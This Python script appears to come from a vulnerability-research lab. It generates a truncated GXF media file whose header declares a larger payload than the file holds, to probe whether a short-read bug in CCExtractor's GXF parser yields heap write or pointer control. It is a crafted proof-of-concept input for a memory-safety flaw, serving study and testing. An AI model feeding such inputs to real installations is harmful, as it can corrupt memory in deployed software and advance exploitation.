#!/usr/bin/env python3
"""Local-only GXF generator: full 24-bit MEDIA size, truncated file payload.

W5 question: ccx_gxf.c:943-944 adds the full declared `mpeg_pic_size` to
data->len even when buffered_read returns short at EOF. Does a short read
produce a new WRITE or pointer control, or only a smaller WRITE plus a larger
memmove of stale heap bytes (general_loop.c:1041)?

The packet header declares a complete PIC_SIZE-byte payload; the file is cut
after PAYLOAD bytes. No pinned source, harness source or prior evidence is
modified.
"""
import struct
import sys
from pathlib import Path

BUFSIZE = 2048 * 1024 + 120
PIC_SIZE = 0x201000
PAYLOAD = int(sys.argv[2], 0) if len(sys.argv) > 2 else 4096
OUT = Path(sys.argv[1] if len(sys.argv) > 1 else
           "lab/frontier/ccextractor2shell/real-build/inputs/short.gxf")


def packet(kind: int, body: bytes) -> bytes:
    total = 16 + len(body)
    header = b"\x00\x00\x00\x00\x01" + bytes([kind]) + struct.pack(">I", total)
    return header + b"\x00\x00\x00\x00\xe1\xe2" + body


def map_packet() -> bytes:
    track = bytes([0x80 | 11, 0xC0]) + struct.pack(">H", 6)
    track += bytes([0x50, 4]) + struct.pack(">I", 6)
    body = b"\xe0\xff" + struct.pack(">H", 0) + struct.pack(">H", len(track))
    return packet(0xBC, body + track)


def main() -> None:
    # Declared (complete) MEDIA packet. Zero-free prefix so the scanner has no
    # start code inside the bytes that actually arrive from the file.
    prefix = (b"MISHE-CCEX" * (PIC_SIZE // 10 + 1))[:PIC_SIZE]
    assert 0 not in prefix
    body = bytes([11, 0]) + struct.pack(">I", 0) + struct.pack(">I", PIC_SIZE)
    body += struct.pack(">I", 0) + b"\x00\x00"
    full = map_packet() + packet(0xBF, body + prefix)
    cut = len(full) - (PIC_SIZE - PAYLOAD)
    data = full[:cut]
    assert len(data) == len(full) - PIC_SIZE + PAYLOAD
    OUT.write_bytes(data)
    print(f"{OUT} size={len(data)} declared_pic_size={PIC_SIZE} "
          f"file_payload={PAYLOAD} short_by={PIC_SIZE - PAYLOAD}")


if __name__ == "__main__":
    main()
